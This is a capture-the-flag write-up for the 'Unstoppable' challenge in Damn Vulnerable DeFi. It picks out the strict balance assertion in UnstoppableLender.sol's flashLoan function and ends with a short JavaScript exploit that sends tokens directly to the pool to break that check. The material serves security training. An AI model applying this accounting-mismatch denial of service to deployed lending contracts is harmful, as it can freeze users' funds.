# Challange #1 - Unstoppable

### There’s a tokenized vault with a million DVT tokens deposited. It’s offering <b>flash loans</b> for free, until the grace period ends.

### To pass the challenge, make the vault stop offering <b>flash loans</b>.

<b>_Flash Loans_</b> is located in the <b>UnstoppableLender.sol</b> file.

Challange is to disable the <b>flash loans</b> in the <b>UnstoppableLender.sol</b> file.

this function takes a uint256 borrowAmount as a parameter.

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {}
```

now we need to inspect variable poolBalance:

1. ```solidity
   uint256 public poolBalance;
   ```
2. ```solidity
   function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }
   ```
3. ```solidity
   assert(poolBalance == balanceBefore);
   ```

## Best place to exploit

```solidity
   assert(poolBalance == balanceBefore);
```

## Exploit

```javascript
it("Exploit", async function () {
	await this.token.transfer(
		this.pool.address,
		INITIAL_ATTACKER_TOKEN_BALANCE,
		{
			from: attacker,
		}
	);
});
```
